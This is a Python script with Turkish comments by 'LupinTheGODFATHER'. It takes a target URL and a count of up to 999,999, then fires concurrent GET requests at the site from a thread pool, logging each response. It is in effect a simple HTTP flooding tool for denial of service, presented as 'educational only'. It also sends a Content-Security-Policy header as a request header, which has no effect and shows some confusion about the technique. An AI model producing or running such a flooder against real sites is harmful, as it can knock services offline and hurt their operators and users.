import requests
import time
import random
import concurrent.futures
import logging

# Log dosyasını yapılandırma
logging.basicConfig(filename="request_logs.log", level=logging.INFO, 
                    format="%(asctime)s - İstek %(message)s")

# İstek gönderme fonksiyonu
def send_request(url, headers, request_number, timeout=5):
    """
    Belirtilen URL'ye istek gönderir ve yanıt durum kodunu döndürür.
    Hataları düzgün şekilde yakalar ve yönetir.KÖTÜYE KULLANMAYIN SADECE EĞİTİM AMAÇLIDIR!!!!! 'LupinTheGODFATHER'
    """
    try:
        response = requests.get(url, headers=headers, timeout=timeout)
        logging.info(f"{request_number} - Yanıt Durum Kodu: {response.status_code}")
        print(f"İstek {request_number} - Yanıt Durum Kodu: {response.status_code}")
        return True
    except requests.exceptions.ConnectionError:
        logging.error(f"{request_number} - Hata: Bağlantı hatası.")
        print(f"İstek {request_number} - Hata: Bağlantı hatası.")
        return False
    except requests.exceptions.Timeout:
        logging.error(f"{request_number} - Hata: Zaman aşımı.")
        print(f"İstek {request_number} - Hata: Zaman aşımı.")
        return False
    except requests.exceptions.RequestException as e:
        logging.error(f"{request_number} - Hata: {e}")
        print(f"İstek {request_number} - Hata: {e}")
        return False

# Ana fonksiyon
def main():
    """
    Kullanıcıdan URL ve istek sayısını alarak paralel olarak URL'ye istek gönderir.
    Anlık olarak kaç istek gönderildiğini ve sonuçları gösterir.KÖTÜYE KULLANMAYIN SADECE EĞİTİM AMAÇLIDIR!!!!! 'LupinTheGODFATHER'
    """
    print("Bu kod yalnızca eğitim amaçlıdır. Lütfen kötüye kullanmayın.")
    
    # Kullanıcıdan URL al
    url = input("URL'yi girin (https://www.sitegiriniz/): ").strip()
    
    if not url.startswith("http"):
        print("Geçerli bir URL giriniz.")
        return
    
    # Kullanıcıdan istek sayısı al
    while True:
        try:
            num_requests = int(input("Kaç istek göndermek istiyorsunuz? (1-999999): "))
            if 1 <= num_requests <= 999999:
                break
            else:
                print("Lütfen 1 ile 999999 arasında bir sayı girin.")
        except ValueError:
            print("Geçerli bir sayı giriniz.")
    
    # Paralel görev sayısı
    max_workers = 19  # Aynı anda yapılacak paralel istek sayısı

    # Content-Security-Policy başlığı
    csp_header = {
        "Content-Security-Policy": (
            "default-src 'self'; script-src 'self'; "
            "style-src 'self'; img-src 'self'; "
            "frame-src 'self'; block-all-mixed-content; "
            "block-all-unknown-blocking"
        )
    }

    # Sayacı başlat
    successful_requests = 0
    failed_requests = 0

    # İstekleri paralel olarak göndermek için ThreadPoolExecutor kullan
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for i in range(num_requests):
            # Her istek için dinamik gecikme ayarla
            delay = random.uniform(0.1, 0.5)
            time.sleep(delay)
            
            # İsteği paralel olarak gerçekleştir
            futures.append(executor.submit(send_request, url, csp_header, i + 1))
        
        # Her isteğin sonucunu kontrol et ve sayaçları güncelle
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                successful_requests += 1
            else:
                failed_requests += 1
            print(f"Başarılı istekler: {successful_requests}, Başarısız istekler: {failed_requests}")

    # İstekler tamamlandıktan sonra özet bilgileri göster
    print("\nİstekler tamamlandı.")
    print(f"Toplam gönderilen istek sayısı: {num_requests}")
    print(f"Başarılı istek sayısı: {successful_requests}")
    print(f"Başarısız istek sayısı: {failed_requests}")

if __name__ == "__main__":
    main()
